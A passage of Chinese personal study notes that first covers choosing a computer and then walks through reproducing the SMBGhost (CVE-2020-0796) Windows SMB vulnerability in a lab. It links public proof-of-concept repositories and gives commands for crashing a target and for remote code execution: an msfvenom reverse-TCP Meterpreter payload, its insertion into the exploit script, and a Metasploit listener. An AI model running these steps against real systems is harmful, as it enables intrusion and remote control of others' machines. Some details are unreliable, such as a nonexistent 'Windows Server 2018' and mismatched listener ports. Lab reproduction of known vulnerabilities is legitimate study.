    1.电脑选择

    笔记本VS台式机
    笔记本优势：便携性强
    台式机优势：性价比高
    性能对比：1W笔记本=5，6k台式机
    硬件需求：
    CPU：至少i5推荐i7（最新一代）
    显卡：推荐4060以上
    内存：16G(8*2)起步，有生产力需求建议32G起步，频率DDR4至少3200以上，DRR5至少6000以上（台式机）。
    笔记本4800频率即T1,5600即T0
    硬盘：推荐pcie4.0固态硬盘1TB
    系统：Windows系统分为：家庭版，专业版，企业版，专业工作站版，教育版
    Windows服务器系统有：2003，2008，2016，2018

    4.永恒之黑漏洞复现

    4.1POC(蓝屏)

    GitHub下载工具：https://github.com/eerykitty/CVE-2020-0796-PoC

    解压并拖入到虚拟机中

    进入文件夹路径输入cmd
    输入pip install ntlm_auth下载工具(已安装python环境)

    输入 python CVE-2020-0796.py 192.168.1.82(靶机ip)
    前提是两台主机要在同一局域网下且靶机关闭了杀毒软件和防火墙

    4.2EXP(RCE)

    在GitHub上下载工具
    https://github.com/chompie1337/SMBGhost_RCE_PoC
    将工具解压好拖入kali中

    利用msf生成一个反弹链接的python木马程序并生成一个exploit文件将指令全部保存进去
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -b ‘\x00’ -i 5 -f python > exploit（指令中的ip地址为kaili靶机的ip）

    使用vim
    vim exploit 编辑文件
    :%s/buf/USER_PAYLOAD 找到文件中所有的buf关键字并全部替换成 USER_PAYLOAD
    :wq! 强制保存退出
    将exploit文件中的所有内容复制粘贴到exploit.py中去
    进入msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    show options

    set lhost kali的ip
    set lport 5556

    run开始监听
    打开另一个终端页面输入python exploit.py -ip 目标ip
